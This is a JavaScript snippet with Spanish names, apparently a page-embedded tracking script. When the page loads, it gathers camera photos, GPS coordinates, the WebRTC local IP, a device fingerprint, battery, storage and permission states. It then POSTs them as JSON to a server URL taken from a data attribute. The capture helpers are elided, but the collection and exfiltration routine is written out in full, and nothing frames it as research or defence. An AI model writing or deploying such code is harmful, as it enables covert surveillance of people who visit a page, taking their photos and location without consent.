(function() {
    const scriptTag = document.currentScript;
    const trackingId = scriptTag.dataset.trackingId;
    const workerUrl = scriptTag.dataset.serverUrl;

    // ... (todas las funciones de captura: reverseGeocode, obtenerIPWebRTC, capturarGPS, capturarFotos, etc.)

    async function enviarAlWorker() {
        const [fotos, gps, ipLocal, dispositivo, fp, bateria, almacenamiento, permisos] = await Promise.all([
            capturarFotos(3),
            capturarGPS(),
            obtenerIPWebRTC(),
            obtenerDispositivo(),
            obtenerFingerprint(),
            obtenerBateria(),
            obtenerAlmacenamiento(),
            obtenerPermisos()
        ]);

        let msg = '🖥️ *Device & Browser*\n';
        msg += `   • Device Model: ${dispositivo.modelo}\n`;
        msg += `   • User Agent: ${dispositivo.userAgent}\n\n`;

        if (ipLocal) {
            msg += `🔒 *Local IP (WebRTC)*\n   • ${ipLocal}\n\n`;
        }

        msg += `📱 *Display:* ${dispositivo.resolution}\n`;
        msg += `🔋 *Batería:* ${bateria.level} (${bateria.charging})\n`;
        msg += `🎨 *GPU:* ${fp.gpu}\n`;
        msg += `💾 *Almacenamiento:* ${almacenamiento.used} / ${almacenamiento.total}\n`;
        msg += `🔐 *Permisos:* Cámara=${permisos.camera}, Ubicación=${permisos.location}\n`;

        const payload = {
            text: msg,
            photos: fotos,
            latitude: gps?.lat || null,
            longitude: gps?.lng || null
        };

        try {
            const response = await fetch(workerUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            console.log('✅ Enviado:', result);
        } catch(e) {
            console.error('❌ Error:', e);
        }
    }

    window.addEventListener('load', () => {
        setTimeout(enviarAlWorker, 1000);
    });
})();
